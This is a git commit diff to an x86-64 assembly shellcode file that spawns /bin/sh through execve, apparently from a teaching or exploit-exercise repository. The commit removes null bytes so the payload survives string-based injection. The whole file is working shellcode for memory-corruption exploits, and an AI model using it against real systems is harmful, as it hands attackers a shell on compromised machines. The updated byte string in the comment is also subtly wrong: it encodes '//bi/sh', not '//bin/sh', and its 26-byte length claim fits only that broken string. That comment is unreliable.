18c3944745deb194661505f0e22ce532e5445dcd
Nicolas Christin <nic.christin@gmail.com>
2019-09-10 23:20:26 +0200

    Eliminate NULL bytes

--- shellcode/shellcode.s
+++ shellcode/shellcode.s
@@ -6,15 +6,16 @@
 ; ld -o shellcode shellcode.o
 ; objdump --disassemble shellcode.o
 ;
-; Assembles to 27 bytes:
+; Assembles to 26 bytes:
 ;
-; "\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x52\x53\x54\x5f\xb8\x3b\x00\x00\x00\x0f\x05"
+; "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x2f\x73\x68\x52\x53\x54\x5f\xb0\x3b\x0f\x05"
 
 section .text
 
 global _start
 
 _start:
+        xor rax, rax            ; So we only have to set al later
 	xor rdx, rdx		; 3rd arg: envp = NULL
 	xor rsi, rsi		; 2nd arg: argv = NULL
 	mov rbx, '//bin/sh'
@@ -22,5 +23,5 @@ _start:
 	push rbx		; push string to stack
 	push rsp		; push string address
 	pop rdi			; 1st arg: path = string address
-	mov rax, 59		; execve is 59
+	mov al, 59		; execve is 59
 	syscall
